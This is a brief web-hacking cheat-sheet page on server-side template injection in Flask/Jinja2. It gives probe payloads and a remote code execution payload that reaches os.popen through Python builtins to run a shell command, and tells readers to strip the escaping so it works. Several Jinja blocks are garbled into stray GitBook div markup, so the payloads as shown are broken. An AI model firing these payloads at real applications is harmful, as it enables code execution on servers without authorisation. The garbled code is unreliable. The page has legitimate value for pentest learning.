---
title: Server Side Templates Injections (SSTI)
category: Web
order: 5
---

SSTI (Server Side Templates Injections) occurs when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.

There are different **frameworks** that uses **templates**, this guide could help to detect which is and exploit them.

![Methodology from PayloadsAllTheThings](/hackingnotes/images/ssti_graph.png)

# Flask

Flask is a framework for web applications written in Python and developed from the Werkzeug and Jinja2 tools.

## Syntax SSTI

```python
\{\{7*7\}\}
\{\{ varname \}\}

<div data-gb-custom-block data-tag="if" data-1='1'></div>PRINT<div data-gb-custom-block data-tag="else">NOPRINT</div>

```

## RCE (Remote Code Execution)

```python
<div data-gb-custom-block data-tag="for"><div data-gb-custom-block data-tag="if" data-0='warning'>\{\{x()._module.__builtins__['__import__']('os').popen("touch /tmp/RCE.txt").read()\}\}</div></div>
```
> **Note**: Delete backslashs **\{\{ \}\}** in order to permorm the work desired.


To bypass some restrictions take a look at the following resources:

# References

* [https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
* [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
* h[ttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
